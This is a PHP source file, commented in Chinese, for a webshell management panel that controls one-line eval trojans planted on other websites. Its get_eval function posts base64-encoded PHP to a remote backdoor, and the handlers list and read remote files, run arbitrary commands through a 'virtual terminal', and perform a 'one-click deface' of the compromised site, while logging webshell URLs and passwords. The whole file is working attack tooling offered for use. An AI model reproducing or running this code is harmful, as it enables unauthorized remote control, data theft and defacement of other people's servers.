<?php
//关闭错误输出
error_reporting(0);
//加载代码文件
include 'code.php';
//定义版权
$copyright = 'power by 陌小离';
/**
 * 代码功能：添加连接
 * 提交方式：POST
 * 提交数据：link，pass
 */
if(@$_GET['type'] == 'add' && isset($_POST['link']) && isset($_POST['pass']) ){
	usleep(rand(100,1000));
	$eval = get_eval($_POST['link'], $_POST['pass'], link_code($copyright));
	if($eval == $copyright){
		if(setcookie('webshell['.htmlentities($_POST['link']).']',htmlentities($_POST['pass']))){
			info_write('webshell_list.txt','链接：'.$_POST['link'].' 密码：'.$_POST['pass']);
			$json['code'] = '1';
			$json['msg'] = 'success';
			$json['data_msg'] = '添加成功';
			echo json_encode($json);
		}
		else{
			$json['code'] = '-1';
			$json['msg'] = 'failed';
			$json['data_msg'] = '无法创建cookie';
			echo json_encode($json);
		}
	}
	else{
		$json['code'] = '-1';
		$json['msg'] = 'failed';
		$json['data_msg'] = '无法连接';
		echo json_encode($json);
	}
}
/**
 * 代码功能：删除连接
 * 提交方式：POST
 * 提交数据：link
 */
if(@$_GET['type'] == 'del' && isset($_POST['link']) ){
	usleep(rand(100,1000));
	$url = $_POST['link'];
	if(setcookie('webshell['.htmlentities($url).']',"", time() - 3600)){
		$json['code'] = '1';
		$json['msg'] = 'success';
		$json['data_msg'] = '删除成功';
		echo json_encode($json);
	}
	else{
		$json['code'] = '-1';
		$json['msg'] = 'failed';
		$json['data_msg'] = '未知原因';
		echo json_encode($json);
	}
}
/**
 * 代码功能：文件列表
 * 提交方式：POST
 * 提交数据：link，pass，dir
 */
if(@$_GET['type'] == 'file' && isset($_POST['link']) && isset($_POST['pass']) && isset($_POST['dir'])){
	usleep(rand(100,1000));
	$eval = get_eval($_POST['link'], $_POST['pass'], file_code($_POST['dir']));
	$path = get_eval($_POST['link'], $_POST['pass'], path_code($_POST['link'],$_POST['pass'],$_POST['dir']));
	if(!$eval || !$path){
		$json['code'] = '-1';
		$json['msg'] = 'failed';
		$json['data_msg'] = '无法连接';
		echo json_encode($json);
	}
	else{
		$file_arr = array_filter(explode('||', $eval));
		if(count($file_arr) <= 1){
			$json['code'] = '-1';
			$json['msg'] = 'failed';
			$json['data_msg'] = '权限不足';
			echo json_encode($json);
		}
		else{
			@$fileListHtml = '';
			foreach ($file_arr as $fileList){
			    $file=explode('|', $fileList);
			    //[0]类型|[1]文件夹名|[2]文件夹路径
			    //[0]类型|[1]文件名|[2]文件路径|[3]文件大小|[4]文件后缀|[5]处理函数|[6]显示文字|[7]是否激活|[8]创建时间|[9]修改时间
			    @$file_path = str_replace('//','/',$file[2]);
			    if($file[0] == 'dir'){
			        @$fileListHtml .= '<tr><td><i class="fa fa-folder"></i>&nbsp;<a onclick="openDir(\''.$_POST['link'].'\',\''.$_POST['pass'].'\',\''.$file_path.'\')">'.$file[1].'</a></td><td>文件夹</td><td>----</td><td>----</td><td>----</td><td>----</td></tr>';
			    }
			    if($file[0] == 'file'){
			        @$fileListHtml .= '<tr><td><i class="fa fa-file"></i>&nbsp;'.$file[1].'</td><td>'.$file[4].'文件</td><td>'.$file[3].'</td><td>'.$file[8].'</td><td>'.$file[9].'</td><td><button type="button" class="btn btn-xs btn-success" onclick="'.$file[5].'(\''.$_POST['link'].'\',\''.$_POST['pass'].'\',\''.$file[2].'\')" '.$file[7].'>'.$file[6].'</button><button type="button" class="btn btn-xs btn-warning" onclick="renameFile(\''.$_POST['link'].'\',\''.$_POST['pass'].'\',\''.$file[2].'\')">重命名</button><button type="button" class="btn btn-xs btn-danger" onclick="delFile(\''.$_POST['link'].'\',\''.$_POST['pass'].'\',\''.$file[2].'\')">删除</button></td></tr>';
			    }
			}
			$json['code'] = '1';
			$json['msg'] = 'success';
			$json['data_msg'] = $fileListHtml;
			$json['data_path'] = $path;
			echo json_encode($json);
		}
	}
}
/**
 * 代码功能：一键挂黑
 * 提交方式：POST
 * 提交数据：link，pass，nick，qq
 */
if(@$_GET['type'] == 'hack' && isset($_POST['link']) && isset($_POST['pass']) && isset($_POST['nick']) && isset($_POST['qq'])){
	usleep(rand(100,1000));
	$eval = get_eval($_POST['link'], $_POST['pass'], hack_code($_POST['nick'], $_POST['qq']));
	if(!$eval){
		$json['code'] = '-1';
		$json['msg'] = 'failed';
		$json['data_msg'] = '无法连接';
		echo json_encode($json);
	}
	else{
		if($eval == '挂黑成功'){
			$json['code'] = '1';
			$json['msg'] = 'success';
			$json['data_msg'] = '挂黑成功';
			echo json_encode($json);
		}
		else{
			$json['code'] = '-1';
			$json['msg'] = 'failed';
			$json['data_msg'] = '挂黑失败';
			echo json_encode($json);
		}
	}
}
/**
 * 代码功能：查看图片
 * 提交方式：POST
 * 提交数据：link，pass，dir
 */
if(@$_GET['type'] == 'readImg' && isset($_POST['link']) && isset($_POST['pass']) && isset($_POST['dir'])){
	usleep(rand(100,1000));
	$eval = get_eval($_POST['link'],$_POST['pass'],img_code($_POST['dir']));
	if(!$eval){
		$json['code'] = '-1';
		$json['msg'] = 'failed';
		$json['data_msg'] = '无法连接';
		echo json_encode($json);
	}
	else{
		if(strpos($eval,';base64,')){
			$json['code'] = '1';
			$json['msg'] = 'success';
			$json['data_msg'] = $eval;
			echo json_encode($json);
		}
		else{
			$json['code'] = '-1';
			$json['msg'] = 'failed';
			$json['data_msg'] = '图片转码失败';
			echo json_encode($json);
		}
	}
}
/**
 * 代码功能：读取文件
 * 提交方式：POST
 * 提交数据：link，pass，dir
 */
if(@$_GET['type'] == 'readText' && isset($_POST['link']) && isset($_POST['pass']) && isset($_POST['dir'])){
	usleep(rand(100,1000));
	$eval = get_eval($_POST['link'],$_POST['pass'],text_code($_POST['dir']));
	if(!$eval){
		$json['code'] = '-1';
		$json['msg'] = 'failed';
		$json['data_msg'] = '无法连接';
		echo json_encode($json);
	}
	else{
		$json['code'] = '1';
		$json['msg'] = 'success';
		$json['data_msg'] = $eval;
		echo json_encode($json);
	}
}
/**
 * 代码功能：虚拟终端
 * 提交方式：POST
 * 提交数据：link，pass，cmd
 */
if(@$_GET['type'] == 'terminal' && isset($_POST['link']) && isset($_POST['pass']) && isset($_POST['cmd'])){
	usleep(rand(100,1000));
	if($_POST['cmd'] == 'Server_info'){
		$code = cmdl_code();
	}
	else{
		$code = cmd_code($_POST['cmd']);
	}
	$eval = get_eval($_POST['link'],$_POST['pass'],$code);
	if(!$eval){
		$json['code'] = '-1';
		$json['msg'] = 'failed';
		$json['data_msg'] = '无法连接';
		echo json_encode($json);
	}
	else{
		$json['code'] = '1';
		$json['msg'] = 'success';
		$json['data_msg'] = $eval;
		echo json_encode($json);
	}
}
/**
 * 函数名称：连接一句话木马
 * 函数作者：陌小离
 * 函数用法：get_eval(链接, 密码, 执行代码, 开始标记, 结束标记)
 */
function get_eval($url, $pass, $code, $start='<moleft>', $end='</moleft>'){
	$post_data = array(
 	 	$pass => 'eval(base64_decode(\''.$code.'\'));',
	);
	$postdata = http_build_query($post_data);
	$options = array(
		'http' => array(
			'method' => 'POST',
			'header' => 'Content-type:application/x-www-form-urlencoded',
			'content' => $postdata,
			'timeout' => 15 * 60
	    )
	);
	$context = stream_context_create($options);
	@$result = file_get_contents($url, false, $context);
	@$text = mb_convert_encoding($result,'UTF-8',mb_detect_encoding($result, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5')));
    $return = substr($text, strlen($start)+strpos($text, $start),(strlen($text) - strpos($text, $end))*(-1));
	if(!$return){
		return false;
	}
	else{
		return $return;
	}
}
/**
 * 函数名称：写入日志
 * 函数作者：陌小离
 * 函数用法：info_write(文件名称, 写入内容)
 */
function info_write($filename, $info_log){
	if(strpos(@file_get_contents('webshell_list.txt'),$info_log)){
		return false;
	}
	else{
		@$info .= $info_log;
	    @$info .= "\r\n";
	    $fp = fopen($filename, 'a');
	    fwrite($fp, $info);
	    fclose($fp);
	    return true;
	}
}
?>